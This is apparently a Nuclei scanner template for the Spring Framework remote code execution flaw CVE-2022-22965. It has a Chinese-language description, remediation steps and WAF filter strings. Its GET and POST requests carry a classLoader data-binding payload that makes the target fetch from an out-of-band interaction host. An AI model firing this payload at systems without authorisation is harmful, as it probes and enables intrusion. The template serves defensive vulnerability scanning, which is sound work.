id: CVE-2022-22965
info:
  name: Spring Framework - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Spring远程代码执行漏洞
    Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。
  severity: critical
  remediation: |-
    #### 官方修复方案
    当前 Spring Framework 官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。链接如下：
    [https://github.com/spring-projects/spring-framework/tags](https://github.com/spring-projects/spring-framework/tags)
    注：Spring Framework 5.3.18和Spring Framework 5.2.20是 Spring 官方提供的两个安全版本（截止至3月31日）

    #### 临时解决方案
    在应用中全局搜索`@InitBinder`注解，看看方法体内是否调用`dataBinder.setDisallowedFields`方法，如果发现此代码片段的引入,则在原来的黑名单中，添加`{"class.","Class.",".class.",".Class."}`。(注:如果此代码片段使用较多，需要每个地方都追加)
    在应用系统的项目包下新建以下全局类，并保证这个类被Spring 加载到(推荐在Controller所在的包中添加)。完成类添加后，需对项目进行重新编译打包和功能验证测试，并重新发布项目

    #### WAF等安全组件防护
    在WAF等网络防护设备上，根据实际部署业务的流量情况，实现对`"class.","Class.",".class.",".Class."`等字符串的规则过滤，并在部署过滤规则后，对业务运行情况进行测试，避免产生额外影响。
requests:
- path:
  - '{{BaseURL}}/?class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx'
  method: GET
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: interactsh_request
    words:
    - 'User-Agent: Java'
    case-insensitive: true
  matchers-condition: and
  path:
  - '{{BaseURL}}'
  method: POST
  body: |
    class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx
  headers:
    Content-Type: application/x-www-form-urlencoded
